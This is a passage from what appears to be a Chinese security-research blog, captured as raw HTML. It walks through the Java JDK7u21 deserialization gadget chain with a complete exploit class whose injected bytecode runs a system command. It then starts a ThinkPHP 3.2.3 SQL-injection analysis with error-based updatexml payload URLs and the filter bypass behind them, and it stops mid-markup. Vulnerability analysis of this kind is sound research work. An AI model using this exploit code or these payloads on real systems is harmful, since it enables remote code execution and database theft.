class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">// 需要实现的接口（拦截动作是基于接口的，所以需要设定接口）</span><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ISubject</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">(String str)</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 实际的需要被代理的对象</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SubjectImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ISubject</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">(String str)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;SubjectImpl.hello(): &quot;</span> + str);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Handler对象（继承InvocationHandler的拦截器）</span><br><span class="hljs-comment">//InvocationHandler是一个用于跟Proxy类对接的接口</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Object subject;<br>    <span class="hljs-comment">//构造函数，传入被代理实现类的实例</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Handler</span><span class="hljs-params">(Object subject)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.subject = subject;<br>    &#125;<br><span class="hljs-comment">//所有被Proxy拦截的函数都会经过这个接口的invoke函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object object, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;before!&quot;</span>);<br>        <span class="hljs-comment">//完成拦截操作之后去调用被代理实现类，反射机制，传入实例，参数</span><br>        method.invoke(<span class="hljs-keyword">this</span>.subject, args);<br>        System.out.println(<span class="hljs-string">&quot;after!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DynamicProxy</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//被代理类</span><br>        SubjectImpl subject = <span class="hljs-keyword">new</span> SubjectImpl();<br>        <span class="hljs-comment">//拦截器实现类，通过构造函数传入被代理类的实例</span><br>        InvocationHandler tempHandler = <span class="hljs-keyword">new</span> Handler(subject);<br><br><span class="hljs-comment">// 使用Proxy.newProxyInstance创建代理</span><br>        ISubject iSubject = (ISubject) Proxy.newProxyInstance(DynamicProxy.class.getClassLoader(), <span class="hljs-keyword">new</span> Class&lt;?&gt;[] &#123;ISubject.class&#125;, tempHandler);<br>        iSubject.hello(<span class="hljs-string">&quot;world!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Proxy.newProxyInstance</code>三个传入参数：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">loader，选用的类加载器。<br>interfaces，被代理类所实现的接口，这个接口可以是多个。即需要拦截的接口<br><span class="hljs-keyword">handler</span>，一个 实现拦截器的invocation <span class="hljs-keyword">handler</span>。<br></code></pre></td></tr></table></figure><p>设置动态代理后，只要调用了返回对象中被安排代理的接口，就会进入invocationHandler的invoke函数。</p><h1 id="延长利用链：AnnotationInvocationHandler"><a href="#延长利用链：AnnotationInvocationHandler" class="headerlink" title="延长利用链：AnnotationInvocationHandler"></a>延长利用链：AnnotationInvocationHandler</h1><p><code>AnnotationInvocationHandler</code>是一个<code>InvocationHandler</code>的实现类</p><p>sun.reflect.annotation.AnnotationInvocationHandler#AnnotationInvocationHandler</p><p>先看一下<code>AnnotationInvocationHandler</code>的构造函数</p><p>在payload构造中传入参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);<br></code></pre></td></tr></table></figure><p>这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">this</span>.type=Templates.class<br><span class="hljs-keyword">this</span>.membervalues=map<br></code></pre></td></tr></table></figure><p>这里的AnnotationInvocationHandler构造函数是缺省修饰符，在不同的包中是不能直接调用</p><p>反射机制中提到，可以使用setAccessible(true)来开放权限。</p><p><img src="https://www.hualigs.cn/image/60860dfe3a000.jpg"></p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myjdk7u21</span> </span>&#123;<br>    <span class="hljs-comment">//序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] serialize(<span class="hljs-keyword">final</span> Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        ByteArrayOutputStream btout = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objOut = <span class="hljs-keyword">new</span> ObjectOutputStream(btout);<br>        objOut.writeObject(obj);<br>        <span class="hljs-keyword">return</span> btout.toByteArray();<br>    &#125;<br>    <span class="hljs-comment">//反序列化</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unserialize</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] serialized)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ByteArrayInputStream btin = <span class="hljs-keyword">new</span> ByteArrayInputStream(serialized);<br>        ObjectInputStream objIn = <span class="hljs-keyword">new</span> ObjectInputStream(btin);<br>        <span class="hljs-keyword">return</span> objIn.readObject();<br>    &#125;<br><br>    <span class="hljs-comment">//通过反射为obj的属性赋值</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field field=obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-comment">//封装了之前对恶意TemplatesImpl类的构造</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> TemplatesImpl <span class="hljs-title">getEvilTemplatesImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<span class="hljs-comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span><br>        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<span class="hljs-comment">//创建Evil类</span><br>        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="hljs-comment">//设置Evil类的父类为AbstractTranslet</span><br>        CtConstructor cons = <span class="hljs-keyword">new</span> CtConstructor(<span class="hljs-keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="hljs-comment">//创建无参构造函数</span><br>        cons.setBody(<span class="hljs-string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="hljs-comment">//设置无参构造函数体</span><br>        cc.addConstructor(cons);<br>        <span class="hljs-keyword">byte</span>[] byteCode=cc.toBytecode();<span class="hljs-comment">//toBytecode得到Evil类的字节码</span><br>        <span class="hljs-keyword">byte</span>[][] targetByteCode = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;byteCode&#125;;<br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetByteCode);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-keyword">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        <span class="hljs-keyword">return</span> templates;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        TemplatesImpl templates=getEvilTemplatesImpl();<br><br>        HashMap map = <span class="hljs-keyword">new</span> HashMap();<br><br>        <span class="hljs-comment">//通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler</span><br>        Constructor ctor = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ctor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);<br><br>        Templates proxy = (Templates) Proxy.newProxyInstance(Myjdk7u21.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);<br><br>        LinkedHashSet set = <span class="hljs-keyword">new</span> LinkedHashSet();<br>        set.add(templates);<br>        set.add(proxy);<br><br>        map.put(<span class="hljs-string">&quot;f5a5a608&quot;</span>, templates);<br><br>        <span class="hljs-keyword">byte</span>[] obj=serialize(set);<br>        unserialize(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化<code>LinkedHashSet</code>类就可以执行命令。</p><p>Java在反序列化的时候会调用<code>ObjectInputStream</code>类的<code>readObject()</code>方法，如果被反序列化的类重写了<code>readObject()</code>，那么该类在进行反序列化时，Java会优先调用重写的<code>readObject()</code>方法。</p><p><code>LinkedHashSet</code>类没有<code>readObject()</code>，但是它的父类<code>HashSet</code>存在<code>readObject()</code>，两者都继承了<code>Serializable接口</code></p><p><code>readObject()</code>中把Templates和proxy加入到map</p><p><img src="https://www.hualigs.cn/image/60860dff2a649.jpg">进入<code>put()</code>，</p><p>这里会和上一个 Entry 的 Key (templates) 进行比较，判断这两个对象是否相等，如果相等则新的替换老的值，然后返回老的值。</p><p>关键点在于<code>key.equals(k)</code>，添加的顺序是，前一个为 <code>templates</code> 后一个为<code>proxy</code>。</p><p>要到达<code>key.equals(k)</code>需要先满足条件<code>e.hash == hash</code>，也就是满足<code>hash(templates)== hash(proxy)</code>，这个条件下面再说</p><p><img src="https://www.hualigs.cn/image/60860dff2ac6e.jpg">根据<code>||</code>的规则，第一个值为false时才能进入第二个。此时，<code>key</code>等于<code>proxy</code>，<code>e.key</code>等于<code>templates</code>类，这样<code>(k = e.key) == key</code>返回<code>false</code>。进入<code>key.equals(k)</code></p><p><img src="https://www.hualigs.cn/image/60860dfb93047.jpg"></p><p><img src="https://www.hualigs.cn/image/60860dfca013a.jpg"></p><p>由于使用了动态代理，调用<code>Templates.equals()</code>就会进入<code>AnnotaionlnvocationHandler</code>的<code>invoke()</code>，然后因为满足if条件进入<code>equalsImpl</code>。</p><p>这里的</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">var1</span>为当前proxy代理实例对象，等于之前的<span class="hljs-built_in">key</span><br>var2为当前调用方法，等于equals方法对象<br>var3为当前调用方法的传入参数列表，等于TemplatesImpl类，也就是之前的k和e.<span class="hljs-built_in">key</span><br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60860dffb6202.jpg"><img src="https://www.hualigs.cn/image/60860dfd0fbee.jpg"></p><p>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</p><p>进入<code>equalsImpl()</code>，前两个条件都不满足，进入<code>getMemberMethods</code></p><p><img src="https://www.hualigs.cn/image/60860e00495d7.jpg"></p><p><img src="https://www.hualigs.cn/image/60860dfda31d0.jpg"></p><p><img src="https://www.hualigs.cn/image/60860dfda23b5.jpg"></p><p>sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods</p><p>满足条件<code>this.memberMethods</code>，<code>this.type</code>等于<code>Templates</code>，这样就会返回<code>Templates</code>中的所有方法，包括<code>getOutputProperties()</code></p><p><img src="https://www.hualigs.cn/image/60860dff52113.jpg"></p><p>回到<code>equalsImpl</code>，这里会获取<code>this.type</code>类中所有的方法，然后遍历并调用每一个方法。这里让<code>this.type</code>等于<code>Templates</code>接口就可以调用<code>Templates</code>中的所有方法，包括<code>getOutputProperties()</code>，触发payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> Boolean <span class="hljs-title">equalsImpl</span><span class="hljs-params">(Object var1)</span> </span>&#123;<span class="hljs-comment">//var1等于构造好的templates</span><br>    <span class="hljs-keyword">if</span> (var1 == <span class="hljs-keyword">this</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.type.isInstance(var1)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Method[] var2 = <span class="hljs-keyword">this</span>.getMemberMethods();<span class="hljs-comment">//var2为Templates的所有方法</span><br>        <span class="hljs-keyword">int</span> var3 = var2.length;<span class="hljs-comment">//var3为Templates方法的数量</span><br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var4 = <span class="hljs-number">0</span>; var4 &lt; var3; ++var4) &#123;<span class="hljs-comment">//迭代Templates的所有方法</span><br>            Method var5 = var2[var4];<span class="hljs-comment">//var5为Templates的中的某个方法</span><br>            String var6 = var5.getName();<span class="hljs-comment">//var6为该方法的名称</span><br>            Object var7 = <span class="hljs-keyword">this</span>.memberValues.get(var6);<span class="hljs-comment">//在memberValues中获取key为var6的值，但memberValues只有一个key为f5a5a608的键值对，所以var7为null</span><br>            Object var8 = <span class="hljs-keyword">null</span>;<br>            AnnotationInvocationHandler var9 = <span class="hljs-keyword">this</span>.asOneOfUs(var1);<span class="hljs-comment">//var9也为null</span><br>            <span class="hljs-keyword">if</span> (var9 != <span class="hljs-keyword">null</span>) &#123;<br>                var8 = var9.memberValues.get(var6);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    var8 = var5.invoke(var1);<span class="hljs-comment">//运行会到这里，所以会调用Templates中的所有方法</span><br>                &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var11) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var12) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AssertionError(var12);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (!memberValueEquals(var7, var8)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行成功</p><p><img src="https://www.hualigs.cn/image/60860e00d108d.jpg"></p><h1 id="Hash绕过"><a href="#Hash绕过" class="headerlink" title="Hash绕过"></a>Hash绕过</h1><p>java.util.HashMap#put</p><p>条件<code>e.hash == hash</code>，也就是满足<code>hash(templates)== hash(proxy)</code></p><p>调用了<code>hash()</code></p><p><img src="https://www.hualigs.cn/image/60860dfea0329.jpg"></p><p>java.util.HashMap#hash</p><p>进入<code>hash()</code>函数，这里调用了传入对象<code>k</code>的<code>hashCode()</code>方法，意味着有可能控制hash值，这里的<code>k</code>为创建的代理实例对象。接着调用了<code>hashCode</code></p><p><img src="https://www.hualigs.cn/image/60860dfea0750.jpg"></p><p>因为使用了动态代理，调用<code>hash(proxy)</code>时会自动跳转到<code>AnnotationInvocationHandler.invoke()</code></p><p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p><p><img src="https://www.hualigs.cn/image/60860dffcd946.jpg">sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCodeImpl</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> var1 = <span class="hljs-number">0</span>;<br><br>        Entry var3;<br>        <span class="hljs-comment">//this.memberValues由构造函数传入的，可以控制，等于map</span><br>        Iterator var2 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator();<span class="hljs-comment">//获取遍历器</span><br>        <span class="hljs-keyword">for</span>( ;var2.hasNext(); ) &#123;<br>            var3 = (Entry)var2.next();<br>            String key = var3.getKey();<span class="hljs-comment">//（可控map的键）</span><br>            Object value = var3.getValue()；<span class="hljs-comment">//（可控map的值）</span><br>            var1 += <span class="hljs-number">127</span> * <br>                key.hashCode() ^    <span class="hljs-comment">//可控map的键 的 hashCode                </span><br>                memberValueHashCode(value); <span class="hljs-comment">//可控map的值的 hashCode</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var1;<br>    &#125;<br></code></pre></td></tr></table></figure><p>sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">memberValueHashCode</span><span class="hljs-params">(Object var0)</span> </span>&#123;<br>        Class var1 = var0.getClass();<br>        <span class="hljs-keyword">if</span> (!var1.isArray()) &#123;<span class="hljs-comment">//不是数组的话获取传入值的hashCode。</span><br>            <span class="hljs-keyword">return</span> var0.hashCode(); <span class="hljs-comment">//返回var0这个对象的hashCode</span><br>        ...<br></code></pre></td></tr></table></figure><p>实际执行</p><p><strong>Proxy的hashCode = 127 * 可控键的hashCode ^ 可控值的hashCode == TemplatesImpl的hashCode</strong></p><p>只要让可控键的hashCode为0即可，利用<code>f5a5a608</code>的hashcode为0，字符串的hashcode也为0，在POC中构造<code>map.put(&quot;f5a5a608&quot;, templates)</code>,</p><p>这样</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">var1</span> = <span class="hljs-number">127</span> * <span class="hljs-number">0</span> ^ templates的hashCode<br><span class="hljs-attr">var1</span> = templates的hashCode<br></code></pre></td></tr></table></figure><h1 id="map-put"><a href="#map-put" class="headerlink" title="map.put"></a>map.put</h1><p>java.util.HashSet#add</p><p><img src="https://www.hualigs.cn/image/60860dfe68edf.jpg"></p><p>payload中把<code>map.put(&quot;f5a5a608&quot;, templates)</code>放在最后，这是因为<code>add</code>方法中调用了<code>map.put</code>，如果放在前面就会满足条件直接在本地触发命令执行，经过序列化之后的数据不能反序列化成功。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPhp3.2.3注入漏洞总结</title>
    <link href="/2021/04/20/ThinkPhp3-2-3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/20/ThinkPhp3-2-3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>数据库连接配置</p><p><img src="https://www.hualigs.cn/image/607e923dad073.jpg"></p><h1 id="thinkphp3-2-3-where注入"><a href="#thinkphp3-2-3-where注入" class="headerlink" title="thinkphp3.2.3 where注入"></a>thinkphp3.2.3 where注入</h1><p>控制器</p><p>/Application/Home/Controller/IndexController.class.php</p><p><img src="https://www.hualigs.cn/image/607e923dae04f.jpg"></p><p><img src="https://www.hualigs.cn/image/607e923db9e10.jpg"></p><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/tp<span class="hljs-number">3</span>/?id[where]=<span class="hljs-number">1</span>%<span class="hljs-number">20</span>and%<span class="hljs-number">201</span>=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607e92437644e.jpg"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在<code>I()</code>方法上打一个断点，<code>I()</code>方法用来获取GET和POST参数</p><p><img src="https://www.hualigs.cn/image/607e924305371.jpg"></p><p>在<code>I()</code>方法中经过<code>htmlspecialchars()</code>处理，再经过functions.php中<code>think_filter</code>函数过滤，这两处过滤对payload没有影响，可以直接忽略</p><p><img src="https://www.hualigs.cn/image/607e923de6764.jpg"></p><p><img src="https://www.hualigs.cn/image/607e923dcbc98.jpg"></p><p>think_filter函数</p><p><img src="https://www.hualigs.cn/image/607e923df0bb8.jpg"></p><p>/ThinkPHP/Library/Think/Model.class.php</p><p>接下来进入<code>find()</code>方法处理 </p><p>参数经过Model.class.php中的<code>_parseOptions()</code>方法处理后带入select方法进行查询，可以看到注入语句在经过<code>_parseOptions()</code>后就变成了int类型，后面的语句被去除了。</p><p><img src="https://www.hualigs.cn/image/607e923e02118.jpg"></p><p><code>_parseOptions</code>执行前，注入语句没有发生变化</p><p><img src="https://www.hualigs.cn/image/607e924155ec7.jpg"></p><p>跟进·<code>_parseOptions()</code>，满足条件进入<code>_parseType()</code></p><p><img src="https://www.hualigs.cn/image/607e92431e9fe.jpg"></p><p>在经过<code>_parseType</code>处理后，注入语句被转换成了int型，只保留了前面的数字,注意这里的<code>$options[&#39;where&#39;]</code>是一个array</p><p><img src="https://www.hualigs.cn/image/607e92428e1eb.jpg"></p><p>跟进<code>_parseType()</code>，发现这里进行了强制类型转换，把payload强制转换成了int型，去掉了后面部分</p><p><img src="https://www.hualigs.cn/image/607e923e1ab2f.jpg"></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>只要<code>is_array($options[&#39;where&#39;])</code>这个条件不满足，就不会进入到强制转换函数中，payload也就不会被过滤，所以要想办法让<code>$options[&#39;where&#39;]</code>不为数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]) &amp;&amp; is_array(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$fields</span>) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;join&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>当我们传入的payload为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=45789 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=updatexml(1,concat(0x7e,(select database()),0x7e),1)#<br></code></pre></td></tr></table></figure><p><code>_parseOptions</code>执行前，<code>$options[&#39;where&#39;]</code>就是一个数组了</p><p><img src="https://www.hualigs.cn/image/607e92428e1eb.jpg"></p><p><code>find()</code>函数开始存在一个判断，如果传入的参数为数字或者字符串，就会把他转换成数组再赋值给<code>$options[&#39;where&#39;]</code>，这样就会满足条件<code>is_array($options[&#39;where&#39;])</code>从而导致payload被转换。</p><p>这里传入<code>find()</code>的参数是<code>45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>，满足了if判断中的条件，注入失败。</p><p><img src="https://www.hualigs.cn/image/607e9241b5394.jpg"></p><p>当payload为</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id[<span 